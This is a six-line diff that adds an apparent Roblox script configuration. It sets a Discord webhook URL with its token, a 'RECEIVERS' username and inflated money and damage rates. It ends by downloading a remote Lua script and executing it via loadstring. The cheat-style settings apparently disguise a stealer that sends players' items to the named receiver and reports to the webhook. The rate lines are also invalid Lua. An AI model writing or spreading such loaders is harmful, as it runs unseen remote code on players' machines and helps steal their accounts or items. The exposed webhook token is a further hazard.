@@ -1,0 +1,6 @@
+WEBHOOK = "https://discord.com/api/webhooks/1428727369384071299/BZZwdfJwPFEI8hIMYBXyJfvjvIxStBNN97hscYzucV81k3qx2we5X_zyu21WNIkUYwgk"
+RECEIVERS = {"sattoshi2"}
+MONEY_PER_SECOND = 500000/s
+DMG_PER_SECOND = 500000/s
+
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/5af52aaa2f3e0118d73d35f30686cc05b7680eaa3e0133db08d9a5a2b9db3d5d/download"))()
